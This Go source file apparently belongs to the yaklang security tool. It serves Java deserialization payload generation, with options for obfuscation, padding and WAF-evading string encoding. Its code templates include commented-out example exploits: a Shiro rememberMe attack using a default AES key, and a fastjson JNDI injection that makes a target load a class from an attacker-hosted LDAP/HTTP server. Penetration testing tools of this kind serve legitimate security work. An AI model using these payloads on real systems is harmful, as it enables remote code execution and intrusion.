package yakgrpc

import (
	"context"
	"errors"
	"fmt"
	"github.com/yaklang/yaklang/common/javaclassparser"
	"sort"
	"strconv"
	"strings"

	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"github.com/yaklang/yaklang/common/yso"
)

type JavaBytesCodeType string

type JavaClassGeneraterOption string

const (
	JavaClassGeneraterOption_ClassName     JavaClassGeneraterOption = "className"
	JavaClassGeneraterOption_IsObfuscation JavaClassGeneraterOption = "isObfuscation"
	JavaClassGeneraterOption_Version       JavaClassGeneraterOption = "version"
	JavaClassGeneraterOption_DirtyData     JavaClassGeneraterOption = "dirtyData"
	JavaClassGeneraterOption_twoByteChar   JavaClassGeneraterOption = "two byte char"
)

type JavaClassGeneraterOptionTypeVerbose string

const (
	String      JavaClassGeneraterOptionTypeVerbose = "String"
	Base64Bytes JavaClassGeneraterOptionTypeVerbose = "Base64Bytes"
	StringBool  JavaClassGeneraterOptionTypeVerbose = "StringBool"
	StringPort  JavaClassGeneraterOptionTypeVerbose = "StringPort"
)

var allExtOptions = []*ypb.YsoClassGeneraterOptionsWithVerbose{
	{Key: string(JavaClassGeneraterOption_IsObfuscation), Value: "true", Type: string(StringBool), KeyVerbose: "混淆", Help: "开启混淆后可以防止被反编译，并加密字符串常量"},
	{Key: string(JavaClassGeneraterOption_DirtyData), Type: string(StringPort), KeyVerbose: "脏数据", Help: "填写脏数据大小"},
	{Key: string(JavaClassGeneraterOption_twoByteChar), Value: "true", Type: string(StringBool), KeyVerbose: "双字节字符", Help: "开启双字节字符后，在序列化时会使用双字节字符的方式对String类型对象编码，在编码后所有字符串常量不会以明文形式展示，可以绕过一些WAF检测"},
	{Key: string(JavaClassGeneraterOption_ClassName), Value: utils.RandStringBytes(8), Type: string(String), KeyVerbose: "类名", Help: "类名"},
	{Key: string(JavaClassGeneraterOption_Version), Value: "52", Type: string(StringPort), KeyVerbose: "Java 版本", Help: "Class 使用的Java 版本"},
}
var classExtOptionsIndex = []int{0, 3, 4}
var gadgetTemplateImplExtOptionsIndex = []int{0, 2, 1, 3, 4}
var gadgetTransformChainExtOptionsIndex = []int{2, 1, 3}

func IsExtOption(key string) bool {
	for _, v := range allExtOptions {
		if v.Key == key {
			return true
		}
	}
	return false
}
func (s *Server) GetAllYsoGadgetOptions(ctx context.Context, _ *ypb.Empty) (*ypb.YsoOptionsWithVerbose, error) {
	allGadget := []*yso.GadgetConfig{}
	names := []string{}
	for name, _ := range yso.YsoConfigInstance.Gadgets {
		if name == yso.GadgetSimplePrincipalCollection {
			continue
		}
		names = append(names, string(name))
	}
	sort.Strings(names)
	for _, name := range names {
		allGadget = append(allGadget, yso.YsoConfigInstance.Gadgets[yso.GadgetType(name)])
	}
	var allGadgetName []*ypb.YsoOption
	for _, gadget := range allGadget {
		allGadgetName = append(allGadgetName, &ypb.YsoOption{Name: gadget.Name, NameVerbose: gadget.Name, Help: gadget.Desc})
	}
	return &ypb.YsoOptionsWithVerbose{
		Options: allGadgetName,
	}, nil
}
func (s *Server) GetAllYsoClassOptions(ctx context.Context, req *ypb.YsoOptionsRequerstWithVerbose) (*ypb.YsoOptionsWithVerbose, error) {
	if req.Gadget == "None" {
		var nextOpts []*ypb.YsoOption
		for name, config := range yso.YsoConfigInstance.Classes {
			if name == yso.ClassEmptyClassInTemplate {
				continue
			}
			nextOpts = append(nextOpts, &ypb.YsoOption{Name: string(config.Name), NameVerbose: string(config.Name), Help: config.Desc})
		}
		return &ypb.YsoOptionsWithVerbose{
			Options: nextOpts,
		}, nil
	}
	cfg, ok := yso.YsoConfigInstance.Gadgets[yso.GadgetType(req.Gadget)]
	if !ok {
		return nil, utils.Errorf("not support gadget: %s", req.Gadget)
	}
	var nextOpts []*ypb.YsoOption
	if cfg.IsTemplateImpl { // templateImpl, next opt is classes
		for _, config := range yso.YsoConfigInstance.Classes {
			nextOpts = append(nextOpts, &ypb.YsoOption{Name: string(config.Name), NameVerbose: string(config.Name), Help: config.Desc})
		}
	} else if cfg.Template != nil { // custom template
		v, ok := yso.YsoConfigInstance.ReflectChainFunction[cfg.ReferenceFun]
		if ok {
			nextOpts = append(nextOpts, &ypb.YsoOption{Name: v.Name, NameVerbose: v.Name, Help: v.Desc})
		}
	} else { // transform, next opt is transform chain type
		for name, tmpl := range cfg.ChainTemplate {
			if tmpl == nil {
				continue
			}
			v, ok := yso.YsoConfigInstance.ReflectChainFunction[name]
			if !ok {
				continue
			}
			nextOpts = append(nextOpts, &ypb.YsoOption{Name: v.Name, NameVerbose: v.Name, Help: v.Desc})
		}
	}
	return &ypb.YsoOptionsWithVerbose{
		Options: nextOpts,
	}, nil
}
func (s *Server) GetAllYsoClassGeneraterOptions(ctx context.Context, req *ypb.YsoOptionsRequerstWithVerbose) (*ypb.YsoClassOptionsResponseWithVerbose, error) {
	gadgetCfg, ok := yso.YsoConfigInstance.Gadgets[yso.GadgetType(req.Gadget)]
	var isNone bool
	if !ok {
		if req.Gadget == "None" {
			isNone = true
		} else {
			return nil, utils.Errorf("not support gadget: %s", req.Gadget)
		}
	}
	var extOptions []*ypb.YsoClassGeneraterOptionsWithVerbose
	if isNone {
		for _, i := range classExtOptionsIndex {
			if i < len(allExtOptions) {
				extOptions = append(extOptions, allExtOptions[i])
			}
		}
	} else {
		if gadgetCfg.IsTemplateImpl {
			for _, i := range gadgetTemplateImplExtOptionsIndex {
				if i < len(allExtOptions) {
					extOptions = append(extOptions, allExtOptions[i])
				}
			}
		} else {
			for _, i := range gadgetTransformChainExtOptionsIndex {
				if i < len(allExtOptions) {
					extOptions = append(extOptions, allExtOptions[i])
				}
			}
		}
	}
	var gadgetOptions []*ypb.YsoClassGeneraterOptionsWithVerbose
	paramsToOptInfo := func(params []*yso.ParamConfig) []*ypb.YsoClassGeneraterOptionsWithVerbose {
		var res []*ypb.YsoClassGeneraterOptionsWithVerbose
		for _, param := range params {
			var typ string
			switch param.Type {
			case "int":
				typ = string(StringPort)
			case "bool":
				typ = string(StringBool)
			case "bytes":
				typ = string(Base64Bytes)
			default:
				typ = string(String)
			}
			res = append(res, &ypb.YsoClassGeneraterOptionsWithVerbose{
				Key: string(param.Name), Value: param.DefaultValue, Type: typ, KeyVerbose: string(param.NameZh), Help: param.Desc,
			})
		}
		return res
	}

	if isNone || gadgetCfg.IsTemplateImpl {
		if cfg, ok := yso.YsoConfigInstance.Classes[yso.ClassType(req.Class)]; ok {
			gadgetOptions = paramsToOptInfo(cfg.Params)
		} else {
			return nil, utils.Errorf("not support class: %s", req.Class)
		}
	} else {
		if gadgetCfg.Template != nil { // custom param
			if v, ok := yso.YsoConfigInstance.ReflectChainFunction[gadgetCfg.ReferenceFun]; ok {
				gadgetOptions = paramsToOptInfo(v.Args)
			}
		} else { // transform chain param
			cfg, ok := yso.YsoConfigInstance.ReflectChainFunction[req.Class]
			if !ok {
				return nil, utils.Errorf("not support chain type: %s", req.Class)
			}
			gadgetOptions = paramsToOptInfo(cfg.Args)
		}
	}
	return &ypb.YsoClassOptionsResponseWithVerbose{Options: append(extOptions, gadgetOptions...)}, nil
}

func generateYsoCode(req *ypb.YsoOptionsRequerstWithVerbose) (string, error) {
	if req == nil {
		return "", utils.Error("request params is nil")
	}
	if req.Class == "" {
		return "", utils.Error("not set class")
	}
	gadgetCodeTmp := `log.setLevel("info")
gadgetObj,err = yso.GetGadget($options)
if err {
    log.error("%v",err)
	return
}
gadgetBytes,err = yso.ToBytes(gadgetObj,$toBytesOptions)
if err {
    log.error("%v",err)
    return
}

// 16进制展示payload
hexPayload = codec.EncodeToHex(gadgetBytes)    
//(hexPayload)

// // Shiro利用
// target = "127.0.0.1:8080"
// base64Key = "kPH+bIxk5D2deZiIxcaaaA==" // base64编码的key
// key,_ = codec.DecodeBase64(base64Key) // 生成key
// payload = codec.PKCS5Padding(gadgetBytes, 16) // 加密payload
// encodePayload = codec.AESCBCEncrypt(key, payload, nil)[0]
// finalPayload = codec.EncodeBase64(append(key, encodePayload...))
// rsp,req,_ = poc.HTTP(` + "`" + `GET /login HTTP/1.1
// Host: {{params(target)}}
// Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
// Accept-Encoding: gzip, deflate
// Accept-Language: zh-CN,zh;q=0.9
// Cache-Control: no-cache
// Cookie: rememberMe={{params(payload)}}
// User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
// ` + "`" + `,poc.params({"payload":finalPayload,"target":target})) // 发送payload
// str.SplitHTTPHeadersAndBodyFromPacket(rsp)
// log.info("发送Payload成功")
// log.info("响应包: ",string(rsp))	`

	classCodeTmp := `classObj,err = yso.GenerateClass($options)
if err {
	log.error("%v",err)
	return
}
classBytes,err = yso.ToBytes(classObj)
if err {
	log.error("%v",err)
	return
}

// 16进制展示payload
hexPayload = codec.EncodeToHex(classBytes)    
//println(hexPayload)

// // fastjson利用
// // 参数
// localIp = "1.1.1.1"
// port = 8086
// target = "1.1.1.1"

// httpReverseAddress = sprintf("http://%s:%d", localIp,port)
// ldapReverseAddress = sprintf("ldap://%s:%d/%s", localIp,port,className)
// s = facades.NewFacadeServer(
//     "0.0.0.0", 
//     port, 
//     facades.httpResource(className+".class",classBytes),
//     facades.ldapResourceAddr(className, httpReverseAddress),
//     facades.rmiResourceAddr(className, httpReverseAddress),
// )
// s.OnHandle(fn(msg){
//     log.info("收到请求: %v", msg)
// })
// go s.Serve()
// err = x.WaitConnect(sprintf("%s:%d",localIp,port), 2)
// if err{
//     log.error("连接 FacadeServer 失败，可能启动失败")
//     cancle()
//     return
// }

// rsp,req,err = poc.HTTP(` + "`" + `POST / HTTP/1.1
// Host: {{params(target)}}
// Content-Type: application/json

// {
//     "a":{
//         "@type":"java.lang.Class",
//         "val":"com.sun.rowset.JdbcRowSetImpl"
//     },
//     "b":{
//         "@type":"com.sun.rowset.JdbcRowSetImpl",
//         "dataSourceName":"{{params(reverseAddr)}}",
//         "autoCommit":true
//     }
// }
// ` + "`" + `,poc.params({"target":target,"reverseAddr":ldapReverseAddress}))

// log.info("发送Payload成功")
// log.info("响应包: %s",string(rsp))
`
	if req.Gadget == "None" { // generate class
		optionsCode := []string{}
		optionsCode = append(optionsCode, fmt.Sprintf(`yso.useTemplate("%s")`, req.Class))
		toBytesOptions := []string{}
		for _, option := range req.Options {
			if option.Key == string(JavaClassGeneraterOption_ClassName) {
				optionsCode = append(optionsCode, fmt.Sprintf(`yso.evilClassName("%s")`, option.Value))
			}
			if option.Key == string(JavaClassGeneraterOption_IsObfuscation) && option.Value == "true" {
				optionsCode = append(optionsCode, "yso.obfuscationClassConstantPool()")
			}
			if option.Key == string(JavaClassGeneraterOption_twoByteChar) && option.Value == "true" {
				toBytesOptions = append(toBytesOptions, "yso.twoBytesCharString()")
			}
			if option.Key == string(JavaClassGeneraterOption_Version) {
				optionsCode = append(optionsCode, fmt.Sprintf(`yso.majorVersion(%s)`, option.Value))
			}
			if IsExtOption(option.Key) {
				continue
			}
			optionsCode = append(optionsCode, fmt.Sprintf(`yso.useClassParam("%s","%s")`, option.Key, option.Value))
		}
		classCode := utils.Format(classCodeTmp, map[string]string{
			"options":        strings.Join(optionsCode, ","),
			"toBytesOptions": strings.Join(toBytesOptions, ","),
		})
		return classCode, nil
	} else { // generate gadget
		cfg, ok := yso.YsoConfigInstance.Gadgets[yso.GadgetType(req.Gadget)]
		if !ok {
			return "", utils.Errorf("not support gadget: %s", req.Gadget)
		}
		if cfg.IsTemplateImpl {
			optionsCode := []string{}
			optionsCode = append(optionsCode, fmt.Sprintf(`"%s"`, req.Gadget))
			optionsCode = append(optionsCode, fmt.Sprintf(`yso.useTemplate("%s")`, req.Class))
			toBytesOptions := []string{}
			for _, option := range req.Options {
				if option.Key == string(JavaClassGeneraterOption_ClassName) {
					optionsCode = append(optionsCode, fmt.Sprintf(`yso.evilClassName("%s")`, option.Value))
				}
				if option.Key == string(JavaClassGeneraterOption_DirtyData) {
					n, err := strconv.Atoi(option.Value)
					if err != nil {
						return "", utils.Errorf("invalid dirty data: %s", option.Value)
					}
					toBytesOptions = append(toBytesOptions, fmt.Sprintf("yso.dirtyDataLength(%d)", n))
				}
				if option.Key == string(JavaClassGeneraterOption_twoByteChar) && option.Value == "true" {
					toBytesOptions = append(toBytesOptions, "yso.twoBytesCharString()")
				}
				if option.Key == string(JavaClassGeneraterOption_IsObfuscation) && option.Value == "true" {
					optionsCode = append(optionsCode, "yso.obfuscationClassConstantPool()")
				}
				if option.Key == string(JavaClassGeneraterOption_Version) {
					optionsCode = append(optionsCode, fmt.Sprintf(`yso.majorVersion(%s)`, option.Value))
				}
				if IsExtOption(option.Key) {
					continue
				}
				optionsCode = append(optionsCode, fmt.Sprintf(`yso.useClassParam("%s","%s")`, option.Key, option.Value))
			}
			classCode := utils.Format(gadgetCodeTmp, map[string]string{
				"options":        strings.Join(optionsCode, ","),
				"toBytesOptions": strings.Join(toBytesOptions, ","),
			})
			return classCode, nil
		} else {
			optionsCode := []string{}
			optionsCode = append(optionsCode, fmt.Sprintf(`"%s"`, req.Gadget))
			optionsCode = append(optionsCode, fmt.Sprintf(`"%s"`, req.Class))
			optionsMapTemplate := `{
%s}`
			tmpStr := ""
			toBytesOptions := []string{}
			for _, option := range req.Options {
				if option.Key == string(JavaClassGeneraterOption_DirtyData) {
					n, err := strconv.Atoi(option.Value)
					if err != nil {
						return "", utils.Errorf("invalid dirty data: %s", option.Value)
					}
					toBytesOptions = append(toBytesOptions, fmt.Sprintf("yso.dirtyDataLength(%d)", n))
				}
				if option.Key == string(JavaClassGeneraterOption_twoByteChar) && option.Value == "true" {
					toBytesOptions = append(toBytesOptions, "yso.twoBytesCharString()")
				}
				if IsExtOption(option.Key) {
					continue
				}
				tmpStr += fmt.Sprintf("\t\"%s\":\"%s\",\n", option.Key, option.Value)
			}
			optionsCode = append(optionsCode, fmt.Sprintf(optionsMapTemplate, tmpStr))
			classCode := utils.Format(gadgetCodeTmp, map[string]string{
				"options":        strings.Join(optionsCode, ","),
				"toBytesOptions": strings.Join(toBytesOptions, ","),
			})
			return classCode, nil
		}
	}
}
func (s *Server) GenerateYsoCode(ctx context.Context, req *ypb.YsoOptionsRequerstWithVerbose) (*ypb.YsoCodeResponse, error) {
	code, err := generateYsoCode(req)
	if err != nil {
		return nil, err
	}
	return &ypb.YsoCodeResponse{Code: code}, nil
}

// GenerateYsoPayload a utils for generate yso payload, return value is: token(className),Gadget or Class Instance,payload toByte fun,error
func GenerateYsoPayload(req *ypb.YsoOptionsRequerstWithVerbose) (string, func(opts ...yso.MarshalOptionFun) ([]byte, error), error) {
	if req.Gadget == "None" {
		_, ok := yso.YsoConfigInstance.Classes[yso.ClassType(req.Class)]
		if !ok {
			return "", nil, utils.Errorf("not support class: %s", req.Class)
		}
		var opts []yso.GenClassOptionFun
		opts = append(opts, yso.SetClassType(yso.ClassType(req.Class)))
		toBytesOpt := []yso.MarshalOptionFun{}
		var fileName string
		for _, option := range req.Options {
			if option.Key == string(JavaClassGeneraterOption_ClassName) {
				fileName = fmt.Sprintf("%s.class", option.Value)
				opts = append(opts, yso.SetClassName(option.Value))
			}
			if option.Key == string(JavaClassGeneraterOption_IsObfuscation) && option.Value == "true" {
				opts = append(opts, yso.SetObfuscation())
			}
			if option.Key == string(JavaClassGeneraterOption_Version) {
				n, err := strconv.Atoi(option.Value)
				if err != nil {
					return "", nil, err
				}
				opts = append(opts, yso.SetMajorVersion(uint16(n)))
			}
			if option.Key == string(JavaClassGeneraterOption_twoByteChar) && option.Value == "true" {
				toBytesOpt = append(toBytesOpt, yso.SetToBytesTwoBytesString())
			}
			if IsExtOption(option.Key) {
				continue
			}
			opts = append(opts, yso.SetClassParam(option.Key, option.Value))
		}
		if fileName == "" {
			return "", nil, errors.New("not set className")
		}
		classIns, err := yso.GenerateClass(opts...)
		if err != nil {
			return "", nil, err
		}

		return fileName, func(opts ...yso.MarshalOptionFun) ([]byte, error) {
			return yso.ToBytes(classIns, append(toBytesOpt, opts...)...)
		}, nil
	} else {
		cfg, ok := yso.YsoConfigInstance.Gadgets[yso.GadgetType(req.Gadget)]
		if !ok {
			return "", nil, utils.Errorf("not support gadget: %s", req.Gadget)
		}
		if cfg.IsTemplateImpl {
			var opts []yso.GenClassOptionFun
			opts = append(opts, yso.SetClassType(yso.ClassType(req.Class)))
			toBytesOpt := []yso.MarshalOptionFun{}
			var fileName string
			for _, option := range req.Options {
				if option.Key == string(JavaClassGeneraterOption_ClassName) {
					fileName = fmt.Sprintf("%s.class", option.Value)
					opts = append(opts, yso.SetClassName(option.Value))
				}
				if option.Key == string(JavaClassGeneraterOption_IsObfuscation) && option.Value == "true" {
					opts = append(opts, yso.SetObfuscation())
				}
				if option.Key == string(JavaClassGeneraterOption_DirtyData) {
					v, err := strconv.Atoi(option.Value)
					if err != nil {
						return "", nil, utils.Errorf("dirty data error: %v", err)
					}
					toBytesOpt = append(toBytesOpt, yso.SetToBytesDirtyDataLength(v))
				}
				if option.Key == string(JavaClassGeneraterOption_Version) {
					n, err := strconv.Atoi(option.Value)
					if err != nil {
						return "", nil, err
					}
					opts = append(opts, yso.SetMajorVersion(uint16(n)))
				}
				if option.Key == string(JavaClassGeneraterOption_twoByteChar) && option.Value == "true" {
					toBytesOpt = append(toBytesOpt, yso.SetToBytesTwoBytesString())
				}
				if IsExtOption(option.Key) {
					continue
				}
				opts = append(opts, yso.SetClassParam(option.Key, option.Value))
			}
			if fileName == "" {
				return "", nil, errors.New("not set className")
			}
			opts = append(opts, yso.SetClassType(yso.ClassType(req.Class)))
			o, err := yso.GenerateGadget(req.Gadget, utils.InterfaceToSliceInterface(opts)...)
			if err != nil {
				return "", nil, err
			}

			return fileName, func(opts ...yso.MarshalOptionFun) ([]byte, error) {
				return yso.ToBytes(o, append(toBytesOpt, opts...)...)
			}, nil
		} else {
			opts := []any{}
			opts = append(opts, req.Class)
			params := map[string]string{}
			opts = append(opts, params)
			toBytesOpt := []yso.MarshalOptionFun{}
			var fileName string
			for _, option := range req.Options {
				if option.Key == string(JavaClassGeneraterOption_twoByteChar) && option.Value == "true" {
					toBytesOpt = append(toBytesOpt, yso.SetToBytesTwoBytesString())
				}
				if option.Key == string(JavaClassGeneraterOption_ClassName) {
					fileName = fmt.Sprintf("%s.class", option.Value)
				}
				if IsExtOption(option.Key) {
					continue
				}
				params[option.Key] = option.Value
			}
			o, err := yso.GenerateGadget(req.Gadget, opts...)
			if err != nil {
				return "", nil, err
			}
			return fileName, func(opts ...yso.MarshalOptionFun) ([]byte, error) {
				return yso.ToBytes(o, append(toBytesOpt, opts...)...)
			}, nil
		}
	}
}
func (s *Server) GenerateYsoBytes(ctx context.Context, req *ypb.YsoOptionsRequerstWithVerbose) (*ypb.YsoBytesResponse, error) {
	token, payloadGetter, err := GenerateYsoPayload(req)
	if err != nil {
		return nil, err
	}
	payload, err := payloadGetter()
	if err != nil {
		return nil, err
	}
	return &ypb.YsoBytesResponse{
		FileName: token,
		Bytes:    payload,
	}, nil
}
func (s *Server) BytesToBase64(ctx context.Context, req *ypb.BytesToBase64Request) (*ypb.BytesToBase64Response, error) {
	return &ypb.BytesToBase64Response{Base64: codec.EncodeBase64(req.Bytes)}, nil
}

func (s *Server) YsoDump(ctx context.Context, req *ypb.YsoBytesObject) (*ypb.YsoDumpResponse, error) {
	if req == nil || req.Data == nil {
		return nil, utils.Error("request params is nil")
	}
	var result string
	obj1, err := yso.GetJavaObjectFromBytes(req.Data)
	if err != nil {
		obj2, err := javaclassparser.Parse(req.Data)
		if err != nil {
			return nil, utils.Errorf("dump error: %v", err)
		}
		result, err = yso.Dump(obj2)
		if err != nil {
			return nil, utils.Errorf("dump error: %v", err)
		}
	} else {
		result, err = yso.Dump(obj1)
		if err != nil {
			return nil, utils.Errorf("dump error: %v", err)
		}
	}
	return &ypb.YsoDumpResponse{Data: result}, nil
}
